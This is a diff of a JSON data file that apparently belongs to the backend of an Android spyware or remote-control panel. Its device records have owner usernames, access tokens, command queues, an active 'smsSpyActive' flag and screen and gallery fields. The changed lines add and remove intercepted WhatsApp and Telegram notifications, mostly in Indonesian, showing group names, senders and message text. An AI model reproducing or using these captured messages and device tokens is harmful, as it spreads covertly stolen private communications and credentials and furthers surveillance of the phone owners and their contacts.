@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776768025755,
+    "lastSeen": 1776768028769,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -4699,6 +4699,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3807 pesan dari 20 chat",
+        "time": "21/04 17:40",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776768026860
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎GB ZUNZ PEKALONGAN (914 pesan): ~ ‍\n່ ‍ ‍‍ ‍ ‍",
         "content": "ada nokos ga mas??",
         "time": "21/04 17:40",
@@ -8688,14 +8696,6 @@
         "time": "21/04 17:11",
         "pkg": "com.whatsapp",
         "receivedAt": 1776766316029
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎tungau esbeer (172 pesan): ~ «4LF1 4RK4N»",
-        "content": "Siape2 yk yg ke bendungan?",
-        "time": "21/04 17:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766315892
       }
     ],
     "galleryPhotos": [],
@@ -8755,7 +8755,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776768025247,
+    "lastSeen": 1776768028223,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -8771,6 +8771,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:40",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768028961
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:40",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768028949
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 17:40",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768028900
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:40",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768028892
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "5770 pesan baru dari 49 obrolan",
+        "time": "21/04 17:40",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768028798
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
